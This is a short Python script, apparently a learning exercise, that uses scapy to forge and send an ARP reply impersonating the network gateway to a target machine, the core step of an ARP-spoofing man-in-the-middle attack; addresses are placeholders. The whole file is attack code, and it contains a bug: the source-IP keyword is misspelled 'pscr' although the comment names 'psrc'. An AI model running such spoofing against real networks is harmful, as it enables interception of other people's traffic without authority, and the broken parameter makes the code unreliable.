#!/usr/bin/env python

import scapy.all as scapy
#creating respose packet
packet = scapy.ARP(op=2, pdst="Destination (Target) IP address", hwdst="Destination (Target) MAC address", pscr="Source IP address")
# op=2 because it is response
# psrc is source IP address of sender which we need to provide the IP address of gateway


#sending response packet
scapy.send(packet)